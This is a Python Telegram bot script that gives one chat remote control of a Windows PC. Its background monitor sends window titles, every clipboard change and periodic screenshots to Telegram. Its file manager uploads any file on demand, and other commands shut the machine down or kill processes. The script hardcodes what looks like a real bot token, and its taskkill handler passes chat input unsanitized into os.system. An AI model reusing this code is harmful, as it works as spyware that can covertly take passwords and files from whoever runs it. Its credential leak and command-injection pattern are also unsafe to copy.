import telebot
from telebot import types
import pyautogui
import pyperclip
import os
import time
import requests
import subprocess
import win32gui
import threading
import webbrowser
import sys
import ctypes
import pyttsx3  # مكتبة تحويل النص لكلام
from datetime import datetime

# --- 1. إعدادات المسار ---
try:
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
except:
    pass

# --- إعدادات البوت ---
TOKEN = "7441270348:AAE7SFRVxepMoBIw2IGXsbtVM0cf5ryBXAA"
MY_ID = 1431886140

bot = telebot.TeleBot(TOKEN)

# إعدادات النظام
SCREENSHOT_INTERVAL = 60
current_path = os.getcwd()
clipboard_history = []
LOG_FILE = f"Log_{datetime.now().strftime('%Y-%m-%d')}.txt"
file_map = {} 
music_map = {}

# --- المسارات ---
DESKTOP_PATH = os.path.join(os.path.expanduser("~"), "Desktop")
SAVE_DIR = os.path.join(DESKTOP_PATH, "محمود")
MUSIC_DIR = r"D:\music\abo El Shouk"

if not os.path.exists(SAVE_DIR):
    try: os.makedirs(SAVE_DIR)
    except: pass

# --- 2. دوال مساعدة ---
def is_authorized(user_id):
    return user_id == MY_ID

def log_event(text):
    timestamp = datetime.now().strftime("%H:%M:%S")
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f: f.write(f"[{timestamp}] {text}\n")
    except: pass

# دالة نطق الكلام في Thread منفصل لعدم تجميد البوت
def speak_text(text):
    try:
        engine = pyttsx3.init()
        engine.say(text)
        engine.runAndWait()
    except Exception as e:
        print(e)

def create_main_keyboard():
    """لوحة التحكم الشاملة V13"""
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    
    markup.add(types.KeyboardButton('✅ تأكيد التشغيل'), types.KeyboardButton('🔴 إغلاق الجهاز'))
    
    # الصف 2: التحكم في الشكل والصوت
    markup.add(types.KeyboardButton('🖼️ تغيير الخلفية'), types.KeyboardButton('🗣️ نطق نص'))
    
    # الصف 3: التحكم
    markup.add(types.KeyboardButton('🔈 التحكم في الصوت'), types.KeyboardButton('🎵 تشغيل موسيقى'))
    
    # الصف 4
    markup.add(types.KeyboardButton('📸 لقطة شاشة'), types.KeyboardButton('📂 مدير الملفات'))
    
    # الصف 5
    markup.add(types.KeyboardButton('📩 إرسال رسالة'), types.KeyboardButton('🌐 فتح رابط'))
    
    # الصف 6
    markup.add(types.KeyboardButton('📋 سجل الحافظة'), types.KeyboardButton('☠️ قتل برنامج'))
    
    return markup

# --- 3. المراقبة التلقائية ---
def automatic_monitor():
    last_window = ""
    last_clipboard = ""
    last_screenshot_time = time.time()
    
    try:
        bot.send_message(MY_ID, f"🚀 **تم تشغيل النظام (V13 - Full Control)**\n📂 مجلد الاستقبال: Desktop/محمود", reply_markup=create_main_keyboard())
    except: pass

    while True:
        try:
            timestamp = datetime.now().strftime("%H:%M:%S")
            
            # مراقبة النوافذ
            try:
                window = win32gui.GetForegroundWindow()
                curr_window = win32gui.GetWindowText(window)
            except: curr_window = ""

            if curr_window and curr_window != last_window:
                bot.send_message(MY_ID, f"👀 **[نشاط]** {curr_window}")
                log_event(f"نافذة: {curr_window}")
                last_window = curr_window

            # مراقبة الحافظة
            try:
                curr_clip = pyperclip.paste()
                if curr_clip and curr_clip != last_clipboard:
                    bot.send_message(MY_ID, f"📋 **[نسخ]**\n{curr_clip}")
                    clipboard_history.append(f"[{timestamp}] {curr_clip}")
                    last_clipboard = curr_clip
            except: pass

            # صورة تلقائية
            if time.time() - last_screenshot_time > SCREENSHOT_INTERVAL:
                try:
                    shot = "auto.png"
                    pyautogui.screenshot(shot)
                    with open(shot, 'rb') as f: bot.send_photo(MY_ID, f, caption=f"🔄 {timestamp}")
                    os.remove(shot)
                except: pass
                last_screenshot_time = time.time()

            time.sleep(1.5)
        except: time.sleep(5)

# --- 4. الخصائص الجديدة ---

# أ) التحكم في الصوت
@bot.message_handler(func=lambda m: m.text == '🔈 التحكم في الصوت')
def volume_control(message):
    if not is_authorized(message.chat.id): return
    markup = types.InlineKeyboardMarkup(row_width=3)
    markup.add(
        types.InlineKeyboardButton("🔊 رفع الصوت", callback_data="VOL_UP"),
        types.InlineKeyboardButton("🔉 خفض الصوت", callback_data="VOL_DOWN"),
        types.InlineKeyboardButton("🔇 كتم/تشغيل", callback_data="VOL_MUTE")
    )
    bot.reply_to(message, "🎚️ لوحة التحكم في الصوت:", reply_markup=markup)

# ب) نطق النص (Text to Speech)
@bot.message_handler(func=lambda m: m.text == '🗣️ نطق نص')
def ask_tts(message):
    if not is_authorized(message.chat.id): return
    msg = bot.reply_to(message, "🗣️ اكتب الجملة التي تريد للابتوب أن ينطقها:")
    bot.register_next_step_handler(msg, perform_tts)

def perform_tts(message):
    txt = message.text
    bot.reply_to(message, f"🔊 جاري نطق: {txt}")
    threading.Thread(target=speak_text, args=(txt,)).start()

# ج) تغيير الخلفية
@bot.message_handler(func=lambda m: m.text == '🖼️ تغيير الخلفية')
def ask_wallpaper(message):
    if not is_authorized(message.chat.id): return
    msg = bot.reply_to(message, "🖼️ أرسل الصورة الآن (كمرفق أو صورة) ليتم تعيينها خلفية سطح مكتب:")
    bot.register_next_step_handler(msg, set_wallpaper_handler)

def set_wallpaper_handler(message):
    try:
        if message.content_type != 'photo':
            bot.reply_to(message, "❌ يجب إرسال صورة.")
            return

        bot.reply_to(message, "⏳ جاري تحميل الصورة وتعيينها...")
        
        # تحميل الصورة
        file_info = bot.get_file(message.photo[-1].file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        # حفظ الصورة باسم ثابت
        bg_path = os.path.join(SAVE_DIR, "wallpaper_set.jpg")
        with open(bg_path, 'wb') as new_file:
            new_file.write(downloaded_file)
            
        # أمر تغيير الخلفية في ويندوز
        ctypes.windll.user32.SystemParametersInfoW(20, 0, bg_path, 0)
        
        bot.reply_to(message, "✅ تم تغيير خلفية سطح المكتب بنجاح!")
        log_event("تم تغيير خلفية سطح المكتب")
        
    except Exception as e:
        bot.reply_to(message, f"❌ حدث خطأ: {e}")

# --- 5. باقي الأوامر والملفات والموسيقى ---

@bot.message_handler(func=lambda m: m.text == '🎵 تشغيل موسيقى')
def music_menu(message):
    if not is_authorized(message.chat.id): return
    global music_map
    music_map = {}
    
    if not os.path.exists(MUSIC_DIR):
        bot.reply_to(message, f"❌ المجلد غير موجود:\n`{MUSIC_DIR}`", parse_mode="Markdown")
        return

    try:
        files = [f for f in os.listdir(MUSIC_DIR) if f.lower().endswith(('.mp3', '.wav', '.m4a'))]
        if not files:
            bot.reply_to(message, "📂 المجلد فارغ.")
            return

        markup = types.InlineKeyboardMarkup(row_width=1)
        for i, file in enumerate(files):
            key = f"MUS_{i}"
            music_map[key] = file
            markup.add(types.InlineKeyboardButton(f"🎧 {file}", callback_data=key))
        
        bot.reply_to(message, f"🎶 **قائمة التشغيل:**", reply_markup=markup)
    except Exception as e:
        bot.reply_to(message, f"خطأ: {e}")

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    if not is_authorized(call.message.chat.id): return
    global current_path, file_map, music_map
    data = call.data
    
    try:
        # التحكم في الصوت
        if data == "VOL_UP":
            for _ in range(5): pyautogui.press('volumeup')
            bot.answer_callback_query(call.id, "🔊 تم الرفع")
        elif data == "VOL_DOWN":
            for _ in range(5): pyautogui.press('volumedown')
            bot.answer_callback_query(call.id, "🔉 تم الخفض")
        elif data == "VOL_MUTE":
            pyautogui.press('volumemute')
            bot.answer_callback_query(call.id, "🔇 كتم/تشغيل")

        # الموسيقى
        elif data.startswith("MUS_"):
            if data in music_map:
                filename = music_map[data]
                full_path = os.path.join(MUSIC_DIR, filename)
                os.startfile(full_path)
                bot.answer_callback_query(call.id, f"تشغيل: {filename}")

        # مدير الملفات
        elif data == "CD_UP":
            current_path = os.path.dirname(current_path)
            bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                text=f"📂 `{current_path}`", parse_mode="Markdown", reply_markup=get_file_keyboard(current_path))

        elif data in file_map:
            real_name = file_map[data]
            if data.startswith("DIR_"):
                current_path = os.path.join(current_path, real_name)
                bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                    text=f"📂 `{current_path}`", parse_mode="Markdown", reply_markup=get_file_keyboard(current_path))
            elif data.startswith("FILE_"):
                file_path = os.path.join(current_path, real_name)
                bot.answer_callback_query(call.id, "جاري الرفع...")
                with open(file_path, 'rb') as f: bot.send_document(call.message.chat.id, f)

    except Exception as e:
        bot.answer_callback_query(call.id, "خطأ")

# دالة مدير الملفات (مساعدة)
def get_file_keyboard(path):
    global file_map
    file_map = {} 
    markup = types.InlineKeyboardMarkup()
    try:
        items = os.listdir(path)
        folders = [f for f in items if os.path.isdir(os.path.join(path, f))]
        files = [f for f in items if os.path.isfile(os.path.join(path, f))]
        markup.add(types.InlineKeyboardButton("⬆️ ...رجوع للخلف", callback_data="CD_UP"))
        for i, folder in enumerate(folders[:8]): 
            file_key = f"DIR_{i}"
            file_map[file_key] = folder 
            markup.add(types.InlineKeyboardButton(f"📁 {folder}", callback_data=file_key))
        for i, file in enumerate(files[:8]):
            file_key = f"FILE_{i}"
            file_map[file_key] = file
            markup.add(types.InlineKeyboardButton(f"📄 {file}", callback_data=file_key))
    except: markup.add(types.InlineKeyboardButton("خطأ قراءة", callback_data="NONE"))
    return markup

@bot.message_handler(func=lambda m: m.text == '📂 مدير الملفات')
def open_file_manager(message):
    if not is_authorized(message.chat.id): return
    global current_path
    if current_path == "": current_path = os.getcwd()
    bot.send_message(message.chat.id, f"📂 `{current_path}`", parse_mode="Markdown", reply_markup=get_file_keyboard(current_path))

@bot.message_handler(func=lambda m: m.text == '📩 إرسال رسالة')
def ask_message_text(message):
    if not is_authorized(message.chat.id): return
    msg = bot.reply_to(message, "💬 اكتب الرسالة:")
    bot.register_next_step_handler(msg, lambda m: threading.Thread(target=lambda: ctypes.windll.user32.MessageBoxW(0, m.text, "System Alert", 0x40 | 0x1000)).start() or bot.reply_to(m, "✅ تم الإظهار"))

@bot.message_handler(func=lambda m: m.text == '🔴 إغلاق الجهاز')
def shutdown_pc(message):
    if not is_authorized(message.chat.id): return
    bot.reply_to(message, "👋 Shutdown in 5s.")
    os.system("shutdown /s /t 5")

@bot.message_handler(func=lambda m: m.text == '✅ تأكيد التشغيل')
def confirm_running(message):
    if not is_authorized(message.chat.id): return
    bot.reply_to(message, f"✅ Online\n{os.getcwd()}")

@bot.message_handler(func=lambda m: m.text == '🌐 فتح رابط')
def ask_link(message):
    if not is_authorized(message.chat.id): return
    msg = bot.reply_to(message, "🔗 الرابط:")
    bot.register_next_step_handler(msg, lambda m: webbrowser.open(m.text if m.text.startswith('http') else 'https://'+m.text) or bot.reply_to(m, "✅ تم"))

@bot.message_handler(func=lambda m: m.text == '☠️ قتل برنامج')
def ask_kill(message):
    if not is_authorized(message.chat.id): return
    msg = bot.reply_to(message, "اسم البرنامج (chrome.exe):")
    bot.register_next_step_handler(msg, lambda m: os.system(f"taskkill /f /im {m.text}") and bot.reply_to(m, "تم"))

@bot.message_handler(func=lambda m: m.text == '📸 لقطة شاشة')
def screen(m):
    if not is_authorized(m.chat.id): return
    try:
        shot = "s.png"
        pyautogui.screenshot(shot)
        with open(shot, 'rb') as f: bot.send_photo(m.chat.id, f)
        os.remove(shot)
    except: pass

@bot.message_handler(func=lambda m: m.text == '📋 سجل الحافظة')
def history(m):
    if not is_authorized(m.chat.id): return
    bot.reply_to(m, "\n".join(clipboard_history[-10:]) if clipboard_history else "فارغ")

# التشغيل
if __name__ == "__main__":
    t = threading.Thread(target=automatic_monitor)
    t.daemon = True
    t.start()
    print("Bot Started V13...")
    while True:
        try: bot.infinity_polling(timeout=10, long_polling_timeout=5)
        except: time.sleep(5)